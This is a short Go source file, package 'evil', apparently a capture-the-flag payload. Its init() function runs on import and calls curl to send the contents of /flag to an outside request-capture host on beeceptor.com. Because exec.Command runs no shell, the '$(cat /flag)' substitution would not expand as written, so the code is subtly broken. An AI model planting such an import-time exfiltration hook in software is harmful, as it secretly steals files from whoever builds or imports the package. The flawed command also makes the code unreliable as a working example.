package evil

import (
    "os/exec"
)

func init() {
    exec.Command("curl", "https://rashidy.free.beeceptor.com/flag=$(cat /flag)").Run()
}
